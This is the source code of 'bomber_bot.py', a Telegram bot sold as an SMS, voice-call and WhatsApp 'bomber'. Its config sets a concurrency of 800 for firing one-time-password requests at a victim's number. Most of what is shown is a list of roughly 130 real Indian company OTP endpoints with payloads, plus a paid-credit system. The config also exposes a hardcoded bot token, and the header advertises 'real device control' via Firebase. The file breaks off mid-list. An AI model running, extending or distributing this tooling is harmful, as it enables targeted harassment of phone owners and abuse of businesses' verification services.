# bomber_bot.py
# ─────────────────────────────────────────────────────────────
# FINAL BUILD — SMS Bomber + Firebase Real Device Control
#   ▸ SMS Bomber      — third-party OTP APIs (bomb.py + new_bomb.py + extras)
#   ▸ Firebase Blast  — real device webhook control (bommer.py pattern)
#   ▸ Device Viewer   — online/offline, per-device info
#   ▸ Test Slots      — Test ID 1 / Test ID 2
#   ▸ Batch Scanner   — memory-safe on Render free tier
# Requirements:  pip install aiogram aiohttp
# ─────────────────────────────────────────────────────────────

import asyncio
import aiohttp
import aiohttp.web
import base64
import sqlite3
import secrets
import string
import time
import logging
import os
import csv
import io
import json
import re
import sys
import gc

from aiogram import Bot, Dispatcher, F, types, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile,
)

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────
BOT_TOKEN = "8301089530:AAFNYRfY3vbB7IgPybATo14rsUD4Th-ZONI"
DB_PATH   = os.getenv("DB_PATH", "bomber_bot.db")
LOG_PATH  = os.getenv("LOG_PATH", "bomber_bot.log")
ADMIN_IDS_ENV = {5851573541, 45767764855}
PORT      = int(os.getenv("PORT", "10000"))
ADMIN_CONTACT = "@sanjipro5"

DEFAULT_COST_PER_MIN   = 1
DEFAULT_LIFETIME_COST  = 500
DEFAULT_COOLDOWN       = 3
DEFAULT_CONCURRENCY    = 800
DEFAULT_PER_HOST_CAP   = 50
DEFAULT_DAILY_BONUS    = 5
REFERRAL_BONUS         = 3
API_FAIL_THRESHOLD     = 12
LOG_RETENTION_DAYS     = 30
DEFAULT_COIN_COST      = 1
FIREBASE_SCAN_BUDGET   = 3000
FIREBASE_OTP_BUDGET    = 500
FIREBASE_SCAN_PARALLEL = 3
FIREBASE_BATCH_SIZE    = 20
FIREBASE_SCAN_MAX_BYTES = 3 * 1024 * 1024
HTTP_TIMEOUT_TOTAL     = 10
HTTP_TIMEOUT_CONNECT   = 4
USER_AGENT             = ("Mozilla/5.0 (Linux; Android 13; SM-S911B) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/122.0.0.0 Mobile Safari/537.36")
START_TIME             = int(time.time())

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(LOG_PATH, encoding="utf-8"),
    ],
)
log = logging.getLogger("bomber")

# ─────────────────────────────────────────────────────────────
# DATABASE
# ─────────────────────────────────────────────────────────────
_conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
_conn.row_factory = sqlite3.Row
for pragma in ("journal_mode=WAL", "synchronous=NORMAL", "busy_timeout=30000"):
    try:
        _conn.execute(f"PRAGMA {pragma}")
    except Exception:
        pass


def _exec(sql, params=(), fetch=None):
    with _conn:
        cur = _conn.execute(sql, params)
        if fetch == "one":
            return cur.fetchone()
        if fetch == "all":
            return cur.fetchall()
        return cur.lastrowid


def _col_exists(table, col):
    cur = _conn.execute(f"PRAGMA table_info({table})")
    return any(row["name"] == col for row in cur.fetchall())


# ─────────────────────────────────────────────────────────────
# MASTER ENDPOINTS — SMS Bomber pool
# ─────────────────────────────────────────────────────────────
MASTER_ENDPOINTS = [
    # ═════ VOICE ═════
    ("call:TataCapitalVoice", "call", "POST",
     "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "isOtpViaCallAtLogin": "true"}),
    ("call:SwiggyCall", "call", "POST",
     "https://profile.swiggy.com/api/v3/app/request_call_verification",
     {"Content-Type": "application/json; charset=utf-8"},
     {"mobile": "{target}"}),
    ("call:MMTVoice", "call", "POST",
     "https://www.makemytrip.com/api/4/voice-otp/generate",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("call:GoibiboVoice", "call", "POST",
     "https://www.goibibo.com/user/voice-otp/generate/",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("call:MyntraVoice", "call", "POST",
     "https://www.myntra.com/gw/mobile-auth/voice-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("call:FlipkartVoice", "call", "POST",
     "https://www.flipkart.com/api/6/user/voice-otp/generate",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("call:AmazonVoice", "call", "POST",
     "https://www.amazon.in/ap/signin",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "action": "voice-otp"}),
    ("call:PaytmVoice", "call", "POST",
     "https://accounts.paytm.com/signin/voice-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("call:ZomatoVoice", "call", "POST",
     "https://www.zomato.com/php/o2_api_handler.php",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=phone={target}&type=voice"),
    ("call:OlaVoice", "call", "POST",
     "https://api.olacabs.com/v1/voice-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("call:UberVoice", "call", "POST",
     "https://auth.uber.com/v2/voice-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("call:ApolloCall", "call", "POST",
     "https://apigateway.apollo247.in/auth-service/getOTPOnCall",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("call:1MGVoice", "call", "POST",
     "https://www.1mg.com/auth_api/v6/create_token",
     {"Content-Type": "application/json; charset=utf-8"},
     {"number": "{target}", "otp_on_call": True}),
    ("call:DoubtnutCall", "call", "POST",
     "https://micro.doubtnut.com/otp/send-call",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("call:SnitchVoice", "call", "POST",
     "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/resend/voice",
     {"Content-Type": "application/json"},
     {"mobile_number": "+91{target}"}),

    # ═════ WHATSAPP ═════
    ("wa:KPNWhatsApp", "whatsapp", "POST",
     "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
     {"Content-Type": "application/json; charset=UTF-8",
      "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f"},
     {"notification_channel": "WHATSAPP",
      "phone_number": {"country_code": "+91", "number": "{target}"}}),
    ("wa:JockeyWhatsApp", "whatsapp", "GET",
     "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{target}?whatsapp=true",
     {}, None),
    ("wa:FoxyWhatsApp", "whatsapp", "POST",
     "https://www.foxy.in/api/v2/users/send_otp",
     {"Content-Type": "application/json"},
     {"user": {"phone_number": "+91{target}"}, "via": "whatsapp"}),
    ("wa:StratzyWhatsApp", "whatsapp", "POST",
     "https://stratzy.in/api/web/whatsapp/sendOTP",
     {"Content-Type": "application/json"},
     {"phoneNo": "{target}"}),
    ("wa:RappiWhatsApp", "whatsapp", "POST",
     "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
     {"Content-Type": "application/json; charset=utf-8"},
     {"country_code": "+91", "phone": "{target}"}),
    ("wa:EkaCareWhatsApp", "whatsapp", "POST",
     "https://auth.eka.care/auth/init",
     {"Content-Type": "application/json"},
     {"phone": "+91{target}", "channel": "whatsapp"}),
    ("wa:JustDialWhatsApp", "whatsapp", "GET",
     "https://www.justdial.com/functions/whatsappverification.php?name=Hi&phone={target}",
     {}, None),

    # ═════ SMS ═════
    ("sms:LenskartSMS", "sms", "POST",
     "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     {"Content-Type": "application/json"},
     {"phoneCode": "+91", "telephone": "{target}"}),
    ("sms:NoBrokerSMS", "sms", "POST",
     "https://www.nobroker.in/api/v3/account/otp/send",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=phone={target}&countryCode=IN"),
    ("sms:PharmEasySMS", "sms", "POST",
     "https://pharmeasy.in/api/v2/auth/send-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:WakefitSMS", "sms", "POST",
     "https://api.wakefit.co/api/consumer-sms-otp/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:ByjusSMS", "sms", "POST",
     "https://api.byjus.com/v2/otp/send",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:HungamaOTP", "sms", "POST",
     "https://communication.api.hungama.com/v1/communication/otp",
     {"Content-Type": "application/json"},
     {"mobileNo": "{target}", "countryCode": "+91", "appCode": "un",
      "messageId": "1", "device": "web"}),
    ("sms:ServeTel", "sms", "POST",
     "https://api.servetel.in/v1/auth/otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
     "_raw=mobile_number={target}"),
    ("sms:MyHubble", "sms", "POST",
     "https://api.myhubble.money/v1/auth/otp/generate",
     {"Content-Type": "application/json"},
     {"phoneNumber": "{target}", "channel": "SMS"}),
    ("sms:Snapmint", "sms", "POST",
     "https://api.snapmint.com/v1/public/sign_up",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:Khatabook", "sms", "POST",
     "https://api.khatabook.com/v1/auth/request-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "app_signature": "wk+avHrHZf2"}),
    ("sms:Nykaa", "sms", "POST",
     "https://www.nykaa.com/app-api/index.php/customer/send_otp",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=mobile_number={target}&source=sms&platform=ANDROID&domain=nykaa"),
    ("sms:RummyCircle", "sms", "POST",
     "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     {"Content-Type": "application/json"},
     {"phone": "{target}",
      "isPlaycircle": "72abdd9a-7038-41c0-a57d-d0022dac60da",
      "deviceName": "Android", "refCode": ""}),
    ("sms:Animall", "sms", "POST",
     "https://animall.in/zap/auth/login",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "signupPlatform": "NATIVE_ANDROID"}),
    ("sms:PenPencil", "sms", "POST",
     "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "firstName": "test", "lastName": "user"}),
    ("sms:Entri", "sms", "POST",
     "https://entri.app/api/v3/users/check-phone/",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:Cosmofeed", "sms", "POST",
     "https://prod.api.cosmofeed.com/api/user/authenticate",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "emailId": "test@example.com", "version": "1.4.28"}),
    ("sms:Aakash", "sms", "POST",
     "https://antheapi.aakash.ac.in/api/generate-lead-otp",
     {"Content-Type": "application/json"},
     {"mobile_psid": "", "mobile_number": "{target}",
      "activity_type": "aakash-myadmission", "webengageData": "",
      "profile": "student", "whatsapp_opt_in": False}),
    ("sms:Revv", "sms", "POST",
     "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "deviceType": "website", "appVersion": "1.0"}),
    ("sms:DeHaat", "sms", "POST",
     "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "client_id": "kisan-app"}),
    ("sms:A23Games", "sms", "POST",
     "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "device_id": "android123",
      "model": "Google,Android SDK built for x86,10",
      "otp": "", "referBy": "", "signup": True, "version": "1.0.5"}),
    ("sms:Spencer", "sms", "POST",
     "https://jiffy.spencers.in/user/auth/otp/send",
     {"Content-Type": "application/json", "User-Agent": "okhttp/4.12.0"},
     {"phone": "{target}"}),
    ("sms:PayMeIndia", "sms", "POST",
     "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "uniqueReferCode": "S10ePIIrbH3"}),
    ("sms:ShoppersStop", "sms", "POST",
     "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "loginType": "SIGNIN_WITH_MOBILE"}),
    ("sms:HyugaAuth", "sms", "POST",
     "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:PokerBaazi", "sms", "POST",
     "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "mfa_channels": "phno"}),
    ("sms:My11Circle", "sms", "POST",
     "https://www.my11circle.com/api/fl/auth/v3/getOtp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:MamaEarth", "sms", "POST",
     "https://auth.mamaearth.in/v1/auth/initiate-signup",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "referralCode": ""}),
    ("sms:HomeTriangle", "sms", "POST",
     "https://hometriangle.com/api/partner/xauth/signup/otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:HealthMug", "sms", "POST",
     "https://api.healthmug.com/account/createotp",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:Kredily", "sms", "POST",
     "https://app.kredily.com/ws/v1/accounts/send-otp/",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:TataMotors", "sms", "POST",
     "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "locationUrl": "https://cars.tatamotors.com",
      "reqBody": "sendOtp"}),
    ("sms:Moglix", "sms", "POST",
     "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "buildVersion": "24.0", "p": "android"}),
    ("sms:BeepKart", "sms", "POST",
     "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "city": 362}),
    ("sms:BikeFixup", "sms", "POST",
     "https://api.bikefixup.com/api/v2/send-registration-otp",
     {"Content-Type": "application/json; charset=UTF-8"},
     {"phone": "{target}", "app_signature": "4pFtQJwcz6y"}),
    ("sms:DoubtnutV4", "sms", "POST",
     "https://api.doubtnut.com/v4/student/login",
     {"Content-Type": "application/json; charset=utf-8"},
     {"phone_number": "{target}", "language": "en"}),
    ("sms:PenPencilResend", "sms", "POST",
     "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
     {"Content-Type": "application/json; charset=utf-8"},
     {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{target}"}),
    ("sms:Apollo247", "sms", "POST",
     "https://www.apollo247.com",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:Brevistay", "sms", "POST",
     "https://www.brevistay.com/cst/app-api/login",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:CaratLane", "sms", "POST",
     "https://www.caratlane.com/cg/dhevudu",
     {"Content-Type": "application/json"},
     {"query": "mutation {SendOtp(input: {mobile: \"{target}\","
               "isdCode: \"91\",otpType: \"registerOtp\"}) "
               "{status {message code}}}"}),
    ("sms:Cossouq", "sms", "POST",
     "https://www.cossouq.com/mobilelogin/otp/send",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=mobilenumber={target}&otptype=register"),
    ("sms:Dream11", "sms", "POST",
     "https://www.dream11.com/auth/passwordless/init",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:GoPinkCabs", "sms", "POST",
     "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=check_mobile_number=1&contact={target}"),
    ("sms:Limeroad", "sms", "POST",
     "https://www.limeroad.com/auth/resend_otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:MyImagineStore", "sms", "POST",
     "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=mobile={target}"),
    ("sms:Samsung", "sms", "POST",
     "https://www.samsung.com/in/api/v1/sso/otp/init",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:Shemaroome", "sms", "POST",
     "https://www.shemaroome.com/users/resend_otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=mobile_no=%2B91{target}"),
    ("sms:Shopsy", "sms", "POST",
     "https://www.shopsy.in/api/1/action/view",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:SnitchSMS", "sms", "POST",
     "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
     {"Content-Type": "application/json"},
     {"mobile_number": "+91{target}"}),
    ("sms:NewMe", "sms", "POST",
     "https://prodapi.newme.asia/web/otp/request",
     {"Content-Type": "application/json"},
     {"mobile_number": "{target}", "resend_otp_request": True}),
    ("sms:Apna", "sms", "POST",
     "https://production.apna.co/api/userprofile/v1/otp/",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "hash_type": "play_store"}),
    ("sms:Smytten", "sms", "POST",
     "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "email": "test@example.com"}),
    ("sms:ShipRocket", "sms", "POST",
     "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
     {"Content-Type": "application/json"},
     {"mobileNumber": "{target}"}),
    ("sms:Stratzy", "sms", "POST",
     "https://stratzy.in/api/web/auth/sendPhoneOTP",
     {"Content-Type": "application/json"},
     {"phoneNo": "{target}"}),
    ("sms:TooToo", "sms", "POST",
     "https://tootoo.in/graphql",
     {"Content-Type": "application/json"},
     {"query": "query sendOtp($mobile_no: String!, $resend: Int!) "
               "{ sendOtp(mobile_no: $mobile_no, resend: $resend) "
               "{ success __typename }}",
      "variables": {"mobile_no": "{target}", "resend": 0}}),
    ("sms:Otpless", "sms", "POST",
     "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "selectedCountryCode": "+91"}),
    ("sms:WellAcademy", "sms", "POST",
     "https://wellacademy.in/store/api/numberLoginV2",
     {"Content-Type": "application/json; charset=UTF-8"},
     {"contact_no": "{target}"}),
    ("sms:Rapido", "sms", "POST",
     "https://customer.rapido.bike/api/otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:Docon", "sms", "POST",
     "https://docon.co.in/api/v1/user/online-login",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:DaycoIndia", "sms", "POST",
     "https://ekyc.daycoindia.com/api/nscript_functions.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=api=send_otp&brand=dayco&mob={target}&resend_otp=resend_otp"),
    ("sms:GoKwik", "sms", "POST",
     "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "country": "in"}),
    ("sms:Snapdeal", "sms", "POST",
     "https://m.snapdeal.com/sendOTP",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:Howzat", "sms", "POST",
     "https://mercury.howzat.com/api/auth/send-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:MeruCab", "sms", "POST",
     "https://merucabapp.com/api/otp/generate",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=mobile_number={target}"),
    ("sms:HousingGQL", "sms", "POST",
     "https://mightyzeus.housing.com/api/gql",
     {"Content-Type": "application/json"},
     {"query": "mutation {sendOtp(phone: \"{target}\") {success}}"}),
    ("sms:Swipe", "sms", "POST",
     "https://app.getswipe.in/api/user/mobile_login",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "resend": True}),
    ("sms:SnapdealFull", "sms", "POST",
     "https://m.snapdeal.com/signupCompleteAjax",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=j_password=null&j_mobilenumber={target}&agree=true"
     "&j_confpassword=null&journey=mobile&numberEdit=false&swp=true"
     "&j_fullname=uyuhyntuhy"),
    ("sms:Flipkart", "sms", "POST",
     "https://1.rome.api.flipkart.com/1/action/view",
     {"Content-Type": "application/json",
      "origin": "https://www.flipkart.com"},
     {"actionRequestContext": {"type": "LOGIN_IDENTITY_VERIFY",
                               "loginIdPrefix": "+91",
                               "loginId": "{target}",
                               "loginType": "MOBILE",
                               "verificationType": "OTP",
                               "screenName": "LOGIN_V4_MOBILE",
                               "sourceContext": "DEFAULT"}}),
    ("sms:Ajio", "sms", "POST",
     "https://login.web.ajio.com/api/auth/signupSendOTP",
     {"Content-Type": "application/json"},
     {"firstName": "Test User", "login": "test@example.com",
      "password": "TestPass123", "genderType": "",
      "mobileNumber": "{target}", "requestType": "SENDOTP"}),
    ("sms:Myntra", "sms", "POST",
     "https://www.myntra.com/gateway/v2/user/otp/generate",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:BigBasket", "sms", "POST",
     "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
     {"Content-Type": "application/json", "x-channel": "BB-PWA",
      "origin": "https://www.bigbasket.com"},
     {"identifier": "{target}"}),
    ("sms:Cilory", "sms", "POST",
     "https://www.cilory.com/app/w/auth/soft",
     {"Content-Type": "application/json;charset=UTF-8"},
     {"mobile": "{target}"}),
    ("sms:LimeroadFull", "sms", "POST",
     "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&mobileOnly=false",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=utf8=%E2%9C%93&authenticity_token="
     "6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D"
     "&user_id={target}"),
    ("sms:Banggood", "sms", "POST",
     "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://m.banggood.in"},
     "_raw=mobilePhone={target}&countryPhoneCode=91&type=1&verifyCode=KmUu"),
    ("sms:Grofers", "sms", "POST",
     "https://grofers.com/v2/accounts/",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://grofers.com", "app_client": "consumer_web"},
     "_raw=user_phone={target}"),
    ("sms:DealShare", "sms", "POST",
     "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "hashCode": "k387IsBaTmn",
      "resendOtp": True, "app": "dealshare",
      "loginType": "8a18d60e0029e806"}),
    ("sms:RentoMojo", "sms", "POST",
     "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
     {"Content-Type": "application/json"},
     {"phone": "{target}"}),
    ("sms:Housing", "sms", "POST",
     "https://login.housing.com/api/v2/send-otp",
     {"Content-Type": "application/json"},
     {"phone": "{target}", "country_url_name": "in"}),
    ("sms:CountryDelight", "sms", "POST",
     "https://api.countrydelight.in/api/v1/customer/requestOtp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}", "platform": "Android", "mode": "new_user"}),
    ("sms:Lifestyle", "sms", "POST",
     "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
     {"Content-Type": "application/json"},
     {"signInMobile": "{target}", "channel": "sms"}),
    ("sms:UrbanClap", "sms", "POST",
     "https://www.urbanclap.com/api/v2/growth/profile/generateOTP",
     {"Content-Type": "application/json;charset=UTF-8",
      "origin": "https://www.urbancompany.com"},
     {"country_id": "IND",
      "phone": {"isd_code": "+91", "phone_wo_isd": "{target}"},
      "device_type": "customer"}),
    ("sms:Paytm", "sms", "POST",
     "https://accounts.paytm.com/v2/api/register",
     {"Content-Type": "application/json",
      "origin": "https://accounts.paytm.com"},
     {"email": "", "mobile": "{target}", "loginPassword": "Pura@1090",
      "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d",
      "redirectUri": "https://paytm.com/v1/api/authresponse",
      "clientId": "paytm-web-secure", "scope": "paytm", "state": "",
      "responseType": "code", "theme": "mp-html5",
      "dob_agreement": True}),
    ("sms:LendingPlate", "sms", "POST",
     "https://lendingplate.com/api.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=mobiles={target}&resend=Resend"),
    ("sms:MPokket", "sms", "POST",
     "https://web-api.mpokket.in/registration/sendOtp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:NuvamaWealth", "sms", "POST",
     "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:TataCapitalBiz", "sms", "POST",
     "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
     {"Content-Type": "application/json"},
     {"mobileNumber": "{target}", "deviceOs": "Android",
      "sourceName": "MitayeFaasleWebsite", "isOdFlow": "no",
      "deviceInfo": "Windows Web Browser"}),
    ("sms:GetInstaCash", "sms", "POST",
     "https://getinstacash.in/sell/getData.php",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest"},
     "_raw=type=sendOTP&mobile={target}"),
    ("sms:Ogonn", "sms", "POST",
     "https://ogonn.in/otp",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl"
     "&mobile={target}"),
    ("sms:Kotak1", "sms", "POST",
     "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/"
     "save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch"
     "&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest"},
     "_raw=cust_full_name=Test+User&cust_email=test%40example.com"
     "&cust_mobile={target}&cust_political_disclaimer=Yes"
     "&cust_fatca_disclaimer=Yes"),
    ("sms:Kotak2", "sms", "POST",
     "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/"
     "resend-otp0on-call.action?SWNToken=1603857646468&flw=vkyc",
     {"X-Requested-With": "XMLHttpRequest"}, None),
    ("sms:AngelBroking", "sms", "POST",
     "https://www.angelbroking.com/form-gateways/oda-form.php",
     {"Content-Type": "application/x-www-form-urlencoded"},
     "_raw=name=Test+User&mobile={target}&city=pune"
     "&web_placement_id=21&ref_url=-"
     "&page_url=%2Fopen-demat-account%2F&post-id=2752"),
    ("sms:Vedantu", "sms", "POST",
     "https://user.vedantu.com/user/preLoginVerification",
     {"Content-Type": "application/json"},
     {"email": None, "phoneCode": "+91",
      "phoneNumber": "{target}", "ver": "11.345"}),
    ("sms:Unacademy", "sms", "POST",
     "https://unacademy.com/api/v3/user/user_check/",
     {"Content-Type": "application/json",
      "authorization": "Bearer undefined"},
     {"phone": "{target}", "country_code": "IN", "otp_type": 1,
      "email": "", "send_otp": True, "is_un_teach_user": False}),
    ("sms:Byjus", "sms", "POST",
     "https://bcas-prod.byjusweb.com/api/send-otp",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://byjus.com"},
     "_raw=phoneNumber={target}&page=free-trial-classes"),
    ("sms:Cuemath", "sms", "POST",
     "https://www.cuemath.com/api/v4/parents/",
     {"Content-Type": "application/json"},
     {"intl_mobile": {"phone": "{target}"},
      "notify": ["notify_on_whatsapp"], "phone": "{target}",
      "email": "test@example.com", "full_name": "Test User",
      "timezone": "Asia/Calcutta",
      "notify_through": "notify_on_whatsapp",
      "form_fields": "full_name,email,intl_mobile"}),
    ("sms:DoubtnutV1", "sms", "POST",
     "https://doubtnut.com/api/v1/user/login",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://doubtnut.com"},
     "_raw=phone={target}"),
    ("sms:AakashDigital1", "sms", "POST",
     "https://digital.aakash.ac.in/mkt-signup-otp-verify",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=&mobileval={target}&otp=6230"),
    ("sms:AakashDigital2", "sms", "POST",
     "https://digital.aakash.ac.in/signup-otp-verify",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "_raw=&mobileval={target}"),
    ("sms:Careers360", "sms", "POST",
     "https://www.careers360.com/ajax/no-cache/user/otp-send",
     {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With": "XMLHttpRequest",
      "origin": "https://www.careers360.com"},
     "_raw=mobile_number={target}&method=call&uid=12692588"),
    ("sms:Netmeds1", "sms", "GET",
     "https://apiv2.netmeds.com/mst/rest/v1/id/details/?mobile={target}",
     {}, None),
    ("sms:Netmeds2", "sms", "GET",
     "https://m.netmeds.com/mst/rest/v1/id/details/{target}",
     {}, None),
    ("sms:MedPlus", "sms", "POST",
     "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
     {"Content-Type": "application/x-www-form-urlencoded",
      "origin": "https://www.medplusmart.com"},
     "_raw=recieveUpdates=1&firstName=Test&lastName=User"
     "&emailId=test%40example.com&password=TestPass%24123"
     "&confirmpwd=TestPass%24123&mobileNumber={target}"
     "&SESSIONID=17C83B4A90182E8DA6F4F15755A43027"
     "&isCordova=false&isPhonepeSwitch=false"),
    ("sms:Purplle", "sms", "GET",
     "https://www.purplle.com/api/account/authorization/send_otp"
     "?phone={target}&action=register",
     {"origin": "https://www.purplle.com"}, None),
    ("sms:TrulyMadly", "sms", "POST",
     "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
     {"Content-Type": "application/json"},
     {"mobile": "{target}"}),
    ("sms:BetterHalf", "sms", "POST",
